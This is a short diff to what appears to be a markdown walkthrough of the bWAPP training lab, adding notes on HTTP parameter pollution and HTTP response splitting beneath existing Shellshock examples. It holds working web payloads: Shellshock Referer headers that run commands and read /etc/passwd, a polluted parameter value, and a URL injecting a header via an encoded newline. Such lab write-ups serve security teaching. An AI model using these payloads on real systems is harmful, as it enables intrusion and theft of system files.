@@ -500,3 +500,17 @@ Referer: () { nothing;}; /bin/touch /tmp/malicious
 ```
 Referer: () { nothing;}; echo; /bin/cat /etc/passwd
 ```
+
+# Other bugs...
+
+### HTTP Paramter Pollution
+Put name
+```
+bee&movie=1
+```
+then every link will choose G.I Joe: Retaliation movie.
+
+### HTTP Response Splitting
+```
+http://192.168.1.20/bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0AReferer%3agoogle.com
+```
